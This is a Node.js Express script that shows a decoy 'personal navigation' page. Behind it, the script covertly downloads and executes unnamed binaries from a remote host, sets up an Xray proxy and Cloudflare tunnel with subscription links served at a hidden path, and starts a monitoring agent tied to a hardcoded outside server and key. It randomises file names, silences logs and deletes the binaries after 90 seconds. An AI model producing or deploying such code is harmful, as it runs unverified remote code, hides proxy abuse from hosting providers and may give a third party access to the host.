const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);

// ========== 1. 核心配置 ==========
const UPLOAD_URL = process.env.UPLOAD_URL || '';      
const PROJECT_URL = process.env.PROJECT_URL || '';    
const AUTO_ACCESS = process.env.AUTO_ACCESS || false; 
const FILE_PATH = process.env.FILE_PATH || './tmp';   
const SUB_PATH = process.env.SUB_PATH || 'qianxiuadmin';       
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;        
const UUID = process.env.UUID || 'dc6f1e49-59fe-424b-8821-c61ebff31d0d'; 
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'jk.zenova.de5.net:8008';        
const NEZHA_PORT = process.env.NEZHA_PORT || '';            
const NEZHA_KEY = process.env.NEZHA_KEY || 'nfZkxIKilkI9lMpFvAD46F8HdA3ci12f';              
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';          
const ARGO_AUTH = process.env.ARGO_AUTH || '';              
const ARGO_PORT = process.env.ARGO_PORT || 8010;            
const CFIP = process.env.CFIP || 'cdns.doon.eu.org';        
const CFPORT = process.env.CFPORT || 443;                   
const NAME = process.env.NAME || 'MyNode';

// 全局变量用于存储生成的节点信息
let globalSubContent = ""; 

// ========== 2. 个人导航 HTML 模板 ==========
const NAV_HTML = `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>我的个人导航 - 简洁高效</title>
    <style>
        :root { --bg-color: #f4f7f9; --card-bg: #ffffff; --text-main: #333; --text-sub: #666; --accent-color: #3b82f6; --hover-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1); --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
        @media (prefers-color-scheme: dark) { :root { --bg-color: #111827; --card-bg: #1f2937; --text-main: #f3f4f6; --text-sub: #9ca3af; } }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: var(--bg-color); color: var(--text-main); line-height: 1.6; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; }
        header { text-align: center; padding: 40px 0; }
        .search-box { margin-top: 20px; position: relative; max-width: 500px; margin-left: auto; margin-right: auto; }
        .search-box input { width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid transparent; background: var(--card-bg); box-shadow: var(--hover-shadow); color: var(--text-main); outline: none; transition: var(--transition); }
        .search-box input:focus { border-color: var(--accent-color); }
        .category-title { margin: 30px 0 15px; font-size: 1.2rem; display: flex; align-items: center; font-weight: 600; }
        .category-title::before { content: ""; width: 4px; height: 1.2rem; background: var(--accent-color); margin-right: 10px; border-radius: 2px; }
        .nav-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; }
        .nav-card { background: var(--card-bg); padding: 15px; border-radius: 12px; text-decoration: none; color: inherit; display: flex; align-items: center; transition: var(--transition); border: 1px solid rgba(0,0,0,0.05); }
        .nav-card:hover { transform: translateY(-3px); box-shadow: var(--hover-shadow); border-color: var(--accent-color); }
        .nav-card img { width: 32px; height: 32px; margin-right: 12px; border-radius: 6px; }
        .nav-card .name { display: block; font-weight: 500; }
        .nav-card .desc { font-size: 0.75rem; color: var(--text-sub); }
        footer { text-align: center; margin-top: 50px; padding: 20px; font-size: 0.8rem; color: var(--text-sub); }
    </style>
</head>
<body>
<div class="container">
    <header>
        <h1>My Navigation</h1>
        <div class="search-box">
            <form action="https://www.google.com/search" method="get" target="_blank">
                <input type="text" name="q" placeholder="搜索一下..." autocomplete="off">
            </form>
        </div>
    </header>
    <div class="category-title">常用工具</div>
    <div class="nav-grid">
        <a href="https://github.com" class="nav-card" target="_blank"><img src="https://github.com/favicon.ico"><div class="info"><span class="name">GitHub</span><span class="desc">代码托管</span></div></a>
        <a href="https://chatgpt.com" class="nav-card" target="_blank"><img src="https://chatgpt.com/favicon.ico"><div class="info"><span class="name">ChatGPT</span><span class="desc">AI 助手</span></div></a>
    </div>
    <footer><p>&copy; ${new Date().getFullYear()} My Navigation. Optimized Version.</p></footer>
</div>
</body>
</html>
`;

// ========== 3. 文件管理与混淆 ==========
if (!fs.existsSync(FILE_PATH)) fs.mkdirSync(FILE_PATH);

function generateRandomName() {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let res = '';
  for (let i = 0; i < 6; i++) res += chars.charAt(Math.floor(Math.random() * chars.length));
  return res;
}

const npmName = generateRandomName(), webName = generateRandomName(), botName = generateRandomName(), phpName = generateRandomName();
const npmPath = path.join(FILE_PATH, npmName), phpPath = path.join(FILE_PATH, phpName);
const webPath = path.join(FILE_PATH, webName), botPath = path.join(FILE_PATH, botName);
const bootLogPath = path.join(FILE_PATH, 'boot.log'), configPath = path.join(FILE_PATH, 'config.json'), subPath = path.join(FILE_PATH, 'sub.txt');

// ========== 4. 路由处理 (修复路径异常) ==========

// 根目录：显示导航站
app.get("/", (req, res) => res.send(NAV_HTML));

// 订阅路径：动态返回节点信息
app.get("/" + SUB_PATH, (req, res) => {
  if (!globalSubContent) {
    res.set('Content-Type', 'text/plain; charset=utf-8');
    return res.send(Buffer.from("Service Starting, please wait...").toString('base64'));
  }
  res.set('Content-Type', 'text/plain; charset=utf-8');
  res.send(globalSubContent);
});

// ========== 5. 核心逻辑 ==========

async function generateConfig() {
  const config = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" } },
      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", wsSettings: { path: "/vless-argo" } } },
      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } } },
      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", wsSettings: { path: "/trojan-argo" } } },
    ],
    outbounds: [{ protocol: "freedom", tag: "direct" }]
  };
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
}

async function downloadFilesAndRun() {
  const arch = (os.arch() === 'arm64' || os.arch() === 'aarch64') ? 'arm' : 'amd';
  const baseUrl = arch === 'arm' ? "https://arm64.ssss.nyc.mn" : "https://amd64.ssss.nyc.mn";
  
  const files = [
    { name: webPath, url: `${baseUrl}/web` },
    { name: botPath, url: `${baseUrl}/bot` }
  ];

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) files.push({ name: npmPath, url: `${baseUrl}/agent` });
    else files.push({ name: phpPath, url: `${baseUrl}/v1` });
  }

  for (const file of files) {
    try {
      const response = await axios({ method: 'get', url: file.url, responseType: 'stream' });
      const writer = fs.createWriteStream(file.name);
      response.data.pipe(writer);
      await new Promise((resolve) => writer.on('finish', resolve));
      fs.chmodSync(file.name, 0o775);
    } catch (e) { console.error(`Download failed: ${file.name}`); }
  }

  // 启动哪吒
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
        const nezhatls = ['443', '8443', '2096'].includes(NEZHA_SERVER.split(':').pop()) ? 'true' : 'false';
        const configYaml = `client_secret: ${NEZHA_KEY}\nserver: ${NEZHA_SERVER}\ntls: ${nezhatls}\nuuid: ${UUID}\ndisable_auto_update: true`;
        fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
        exec(`nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`);
    } else {
        const tlsFlag = ['443', '8443', '2096'].includes(NEZHA_PORT) ? '--tls' : '';
        exec(`nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${tlsFlag} --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`);
    }
  }

  // 启动 Xray
  exec(`nohup ${webPath} -c ${configPath} >/dev/null 2>&1 &`);

  // 启动 Argo
  let argoArgs = ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)
    ? `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`
    : `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${bootLogPath} --loglevel info --url http://localhost:${ARGO_PORT}`;
  
  exec(`nohup ${botPath} ${argoArgs} >/dev/null 2>&1 &`);
}

async function extractDomains() {
  const checkArgo = setInterval(() => {
    if (fs.existsSync(bootLogPath)) {
      const content = fs.readFileSync(bootLogPath, 'utf-8');
      const match = content.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
      if (match) {
        clearInterval(checkArgo);
        generateLinks(match[1]);
      }
    } else if (ARGO_DOMAIN && ARGO_AUTH) {
        clearInterval(checkArgo);
        generateLinks(ARGO_DOMAIN);
    }
  }, 3000);
}

async function generateLinks(argoDomain) {
  const ISP = "Cloudflare"; // 简化获取逻辑以提升速度
  const nodeName = NAME || ISP;
  const VMESS = { v: '2', ps: nodeName, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'none', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, fp: 'firefox'};
  
  const subTxt = `vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}\n
vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}\n
trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}`;

  globalSubContent = Buffer.from(subTxt).toString('base64');
  fs.writeFileSync(subPath, globalSubContent);
  console.log("Subscription updated.");
}

function cleanFiles() {
  setTimeout(() => {
    const files = [bootLogPath, configPath, webPath, botPath, npmPath, phpPath];
    files.forEach(f => { try { if (fs.existsSync(f)) fs.unlinkSync(f); } catch(e) {} });
  }, 90000);
}

async function startserver() {
  await generateConfig();
  await downloadFilesAndRun();
  await extractDomains();
  cleanFiles();
}

startserver().catch(console.error);
app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
